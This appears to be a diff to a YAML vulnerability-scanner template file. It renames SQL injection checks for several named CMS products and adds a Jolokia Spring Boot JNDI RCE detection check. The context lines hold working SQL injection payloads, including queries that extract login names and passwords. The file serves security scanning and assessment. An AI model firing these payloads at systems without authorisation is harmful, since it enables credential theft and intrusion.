@@ -24,7 +24,7 @@ pocs:
             condition: "or"
 
   - id: "diandiancms-sql-vuln"
-    name: "Diandiancms SQL Injection Vulnerability"
+    name: "Diandiancms SQL Vuln"
     requests:
       - method: "GET"
         path: "/index.php/ApiAdminKefu/index?aid=3&uid=3"
@@ -60,7 +60,7 @@ pocs:
             condition: "or"
 
   - id: "crmeb-sql-vuln-1"
-    name: "Crmeb SQL Injection Vulnerability"
+    name: "Crmeb SQL Vuln"
     requests:
       - method: "GET"
         path: '/api/products?sid=1%27'
@@ -72,7 +72,7 @@ pocs:
             condition: "or"
 
   - id: "crmeb-sql-vuln-2"
-    name: "Crmeb SQL Injection Vulnerability"
+    name: "Crmeb SQL Vuln"
     requests:
       - method: "GET"
         path: '/api/products?limit=20&priceOrder=&salesOrder=&selectId=GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(3550=3550,md5(1))),0x7e),3550)'
@@ -96,7 +96,7 @@ pocs:
             condition: "or"
 
   - id: "aspcms-sql-vuln-1"
-    name: "ASPcms SQL Injection Vulnerability"
+    name: "ASPcms SQL Vuln"
     requests:
       - method: "GET"
         path: '/plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20%20frmasterom%20{prefix}user'
@@ -108,7 +108,7 @@ pocs:
             condition: "or"
 
   - id: "aspcms-sql-vuln-2"
-    name: "ASPcms SQL Injection Vulnerability"
+    name: "ASPcms SQL Vuln"
     requests:
       - method: "GET"
         path: '/aspcms/admin_aspcms/_content/_Content/AspCms_ContentFun.asp?action=tdel&id=2=iif(((select asc(mid(LoginName,1,1)) from AspCms_User where UserID=1)=97),2,chr(97))'
@@ -121,7 +121,7 @@ pocs:
             condition: "or"
 
   - id: "pbootcms-sql-vuln"
-    name: "PBootCms SQL Injection Vulnerability"
+    name: "PBootCms SQL Vuln"
     requests:
       - method: "GET"
         path: "/?youc'"
@@ -183,7 +183,7 @@ pocs:
             condition: "or"
 
   - id: "jeecg-boot-sql-vuln"
-    name: "Jeecg-Boot SQL Injection Vulnerability"
+    name: "Jeecg-Boot SQL Vuln"
     requests:
       - method: "POST"
         path: "/jeecg-boot/jmreport/qurestSql"
@@ -1047,4 +1047,16 @@ pocs:
             words:
               - '安装向导'
               - '已经安装成功'
+            condition: "and"
+  - id: "jolokia-rce"
+    name: "springboot-realm-jndi-rce"
+    requests:
+      - method: "GET"
+        path: '/actuator/jolokia/list'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'createJNDIRealm'
+              - 'type=MBeanFactory'
             condition: "and"
